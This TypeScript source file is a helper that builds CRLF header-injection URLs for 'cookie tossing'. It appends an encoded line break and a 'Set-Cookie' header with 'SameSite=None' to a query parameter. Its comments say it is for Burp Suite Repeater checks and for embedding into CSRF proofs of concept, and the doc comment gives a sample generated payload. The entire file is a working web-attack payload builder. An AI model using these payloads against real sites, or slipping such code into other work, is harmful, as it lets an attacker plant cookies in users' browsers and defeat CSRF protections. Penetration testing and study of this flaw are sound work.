/**
 * Helper to construct CRLF header injection and cookie-tossing URLs
 * for manual verification in Burp Suite Repeater or embedding into CSRF PoCs.
 */

export interface CookieInjectionUrlParams {
  rawUrl: string;
  cookieName: string;
  cookieValue: string;
  sameSite?: 'None' | 'Lax' | 'Strict' | 'none';
  customParam?: string;
}

/**
 * Builds a CRLF cookie injection URL from a target endpoint or search URL.
 * 
 * Example:
 * Input URL: https://example.net/?search=Hello+World
 * Cookie: csrfKey=SECRET
 * Output: https://example.net/?search=Hello+World%0d%0aSet-Cookie:%20csrfKey=SECRET%3b%20SameSite=None
 */
export function buildCookieInjectionUrl(params: CookieInjectionUrlParams): string {
  const { rawUrl, cookieName, cookieValue, sameSite = 'None', customParam } = params;
  if (!rawUrl || !rawUrl.trim()) return '';

  const cleanName = cookieName.trim() || 'csrfKey';
  const cleanVal = cookieValue.trim() || 'YOUR-KEY';
  const sameSiteSuffix = sameSite !== 'none' ? `%3b%20SameSite=${sameSite}` : '';
  const injection = `%0d%0aSet-Cookie:%20${encodeURIComponent(cleanName)}=${encodeURIComponent(cleanVal)}${sameSiteSuffix}`;

  const trimmedUrl = rawUrl.trim();

  // If the URL already contains a query string
  if (trimmedUrl.includes('?')) {
    if (customParam && trimmedUrl.includes(`${customParam}=`)) {
      const regex = new RegExp(`(${encodeURIComponent(customParam)}=[^&#]*)`);
      if (regex.test(trimmedUrl)) {
        return trimmedUrl.replace(regex, `$1${injection}`);
      }
    }
    return `${trimmedUrl}${injection}`;
  }

  // If no query string, create one using specified param or default 'search'
  const param = customParam?.trim() || 'search';
  return `${trimmedUrl}?${encodeURIComponent(param)}=test${injection}`;
}
